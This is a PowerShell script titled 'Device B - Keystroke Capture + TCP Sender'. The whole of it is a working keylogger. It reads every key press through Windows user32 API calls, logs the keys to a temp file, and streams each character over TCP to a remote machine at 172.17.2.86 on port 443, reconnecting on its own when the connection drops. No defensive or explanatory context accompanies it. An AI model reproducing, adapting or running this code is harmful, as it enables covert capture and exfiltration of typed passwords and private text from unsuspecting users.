# Device B - Keystroke Capture + TCP Sender
$deviceAIP = "172.17.2.86"   

# Setup temp file
$path = "$env:temp\testing.txt"
if ((Test-Path $path) -eq $false) { New-Item $path }

# Load Windows API
$signatures = @(
    '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]',
    'public static extern short GetAsyncKeyState(int virtualKeyCode);',
    '[DllImport("user32.dll", CharSet=CharSet.Auto)]',
    'public static extern int GetKeyboardState(byte[] keystate);',
    '[DllImport("user32.dll", CharSet=CharSet.Auto)]',
    'public static extern int MapVirtualKey(uint uCode, int uMapType);',
    '[DllImport("user32.dll", CharSet=CharSet.Auto)]',
    'public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
) -join "`n"

if (-not ("API.Win32" -as [type])) {
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace 'API' -PassThru
} else {
    $API = [API.Win32]
}


# Connect to Device A
function New-Connection {
    $c = New-Object System.Net.Sockets.TcpClient($deviceAIP, 443)
    $w = New-Object System.IO.StreamWriter($c.GetStream())
    $w.AutoFlush = $true
    return $c, $w
}

$client, $writer = New-Connection

try {
    while ((Test-Path $path) -ne $false) {
        Start-Sleep -Milliseconds 40

        for ($ascii = 9; $ascii -le 254; $ascii++) {
            $state = $API::GetAsyncKeyState($ascii)
            if ($state -eq -32767) {
                $null = [console]::CapsLock
                $virtualKey   = $API::MapVirtualKey($ascii, 3)
                $kbstate      = New-Object -TypeName Byte[] -ArgumentList 256
                $checkkbstate = $API::GetKeyboardState($kbstate)
                $mychar       = New-Object -TypeName System.Text.StringBuilder
                $success      = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                if ($success -and (Test-Path $path) -eq $true) {
                    # Write to file (original behaviour)
                    [System.IO.File]::AppendAllText($path, $mychar, [System.Text.Encoding]::Unicode)

                    # Send to Device A
                    try {
                        if ($ascii -eq 13) {
                            $writer.Write("`n")
                        } else {
                            $writer.Write($mychar.ToString())
                        }
                    }
                    catch {
                        # Reconnect if connection dropped and retry
                        try { $client.Close() } catch {}
                        $client, $writer = New-Connection
                        if ($ascii -eq 13) {
                            $writer.Write("`n")
                        } else {
                            $writer.Write($mychar.ToString())
                        }
                    }
                }
            }
        }
    }
}
finally {
    if ($writer) { $writer.Close() }
    if ($client) { $client.Close() }
    exit
}
